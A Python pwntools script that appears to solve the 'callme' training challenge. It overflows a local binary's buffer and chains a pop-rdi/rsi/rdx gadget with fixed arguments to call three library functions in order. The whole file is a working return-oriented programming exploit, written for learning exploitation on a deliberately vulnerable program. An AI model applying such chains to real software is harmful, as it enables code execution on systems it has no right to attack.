from pwn import *

pipe = process("./callme",env={"LD_PRELOAD": "./libcallme.so"})
elf = ELF("./callme")
pop_rdi_rsi_rdx_ret = 0x40093c
call_one    =   0x400720
call_two    =   0x400740
call_three  =   0x4006F0

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

chain = b"A" * 40
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_one)

chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_two)

chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_three)

# context.log_level = "debug"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recvall())
